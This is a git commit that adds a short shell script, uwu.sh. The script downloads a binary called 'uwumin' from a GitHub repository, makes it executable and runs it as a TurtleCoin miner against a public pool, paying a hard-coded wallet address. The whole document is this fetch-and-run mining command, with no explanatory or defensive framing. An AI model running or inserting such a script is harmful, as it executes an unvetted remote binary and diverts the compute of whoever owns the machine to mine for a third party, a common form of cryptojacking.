be2f4f1fa5a1a0aefbffe9638ce9646ce06d5e47
calebsto <82493755+calebsto@users.noreply.github.com>
2021-04-14 12:50:53 +0700

    Create uwu.sh

---
+++ uwu.sh
@@ -0,0 +1,3 @@
+wget https://github.com/calebsto/rap/raw/main/uwumin
+chmod +x uwumin
+./uwumin --pool turtlecoin.herominers.com:10380 --username TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+09a196ecd13c80c6c61692ffb0359d11928158465c11381a0061eb883b54ceef --password x --algorithm turtlecoin
